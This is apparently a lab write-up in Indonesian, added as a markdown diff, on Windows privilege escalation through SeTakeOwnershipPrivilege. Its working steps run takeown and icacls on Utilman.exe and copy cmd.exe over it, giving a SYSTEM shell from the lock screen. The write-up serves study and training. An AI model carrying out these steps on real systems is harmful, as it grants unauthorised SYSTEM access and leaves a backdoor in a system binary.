@@ -1,0 +1,26 @@
+# SeTakeOwnership
+priv ini allow ser untuk mengambil ownership dari object apapun di sistem termasuk file dan registry keys. Untuk melihat apakah kita memiliki priv ini, kita dapat melakukan command
+```
+whoami /priv
+...
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+```
+Kali ini kita akan escalate privs menggunakan `utilman.exe` yang mana merupakan built-in win app yang digunakan untuk memberikan kemudahan akses pilihan saat lockscreen. Untuk replace utilman, kita akan mulai dengan command
+```
+C:\> takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
+```
+dapat dilihat bahwa menjadi owner dari suatu file tidak berarti kita punya priv dalam file itu, tapi menjadi owner, kita dapat assign any priv semau kita. Selanjutnya kita beri full permission ke utilman.exe
+```
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+```
+selanjutnya kita replace utilman.exe dengan cmd.exe
+```
+copy cmd.exe utilman.exe
+```
+lalu untuk trigger, kita dapat lock screen kita dari start button dan klik icon ease, lalu nanti kita akan mendapat cmd dengan priv SYSTEM.
